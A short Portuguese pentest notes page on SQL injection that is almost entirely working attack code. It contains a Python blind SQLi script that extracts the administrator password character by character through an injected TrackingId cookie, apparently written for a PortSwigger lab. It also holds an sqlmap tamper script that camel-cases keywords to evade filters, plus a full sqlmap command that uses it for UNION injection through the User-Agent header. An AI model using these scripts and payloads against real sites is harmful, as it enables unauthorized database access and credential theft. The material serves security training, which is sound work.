## SQLi

## Blind SQLi
Script de exemplo para exploração do Blind SQLi com respostas condicionais.<p>
LAB: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
```
import requests
import string

burp0_url = "https://[host]"
burp0_cookies = {"TrackingId": "2OhtAv5umLt0e9Yg", "session": "2yNubi9Et3RQFcH4WCBFiX3LO8RurQ21"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0ae100df03b5e2d68630f39d00cd0013.web-security-academy.net/filter?category=Gifts", "Dnt": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}

char_set = string.ascii_lowercase + string.digits
password = ''

for position in range(1,21):
    for char in char_set:
        burp0_cookies["TrackingId"] = f"2OhtAv5umLt0e9Yg' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username = 'administrator')='{char}"
        print(f"Testando: {position}:{char}")
        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

        if "Welcome" in response.text:
            print(f"Found {position}:{char}")
            password += char
            break
print(f"Pass: {password}")
```
### Script para bypass de filtro palavras
```
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces each keyword a CaMeLcAsE VeRsIoN of it.

    >>> tamper('INSERT')
    'InSeRt'
    """

    retVal = str()

    if payload:
        for i in xrange(len(payload)):
            if (i % 2 == 0):
                # We cannot break 0x12345
                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
                    retVal += payload[i].upper()
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i].lower()
    return retVal
```
   
### Execução do script 

```sqlmap -u 'http://[URL]/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner```
